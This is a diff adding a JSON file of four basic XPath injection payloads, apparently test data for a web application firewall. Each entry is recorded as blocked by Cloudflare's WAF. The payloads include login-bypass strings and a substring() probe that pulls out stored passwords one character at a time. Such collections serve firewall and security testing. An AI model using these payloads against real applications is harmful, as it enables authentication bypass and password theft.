@@ -1,0 +1,63 @@
+{
+  "category": "xpath_injection",
+  "subcategory": "basic",
+  "count": 4,
+  "payloads": [
+    {
+      "id": "xpath_injection-1001",
+      "category": "xpath_injection",
+      "subcategory": "basic",
+      "payload": "' or '1'='1",
+      "description": "XPath OR bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-1002",
+      "category": "xpath_injection",
+      "subcategory": "basic",
+      "payload": "' or 1=1 or ''='",
+      "description": "XPath numeric bypass",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-1003",
+      "category": "xpath_injection",
+      "subcategory": "basic",
+      "payload": "x' or name()='username' or 'x'='y",
+      "description": "XPath name() function",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-1004",
+      "category": "xpath_injection",
+      "subcategory": "basic",
+      "payload": "' or substring(//user[position()=1]/password,1,1)='a",
+      "description": "XPath substring",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
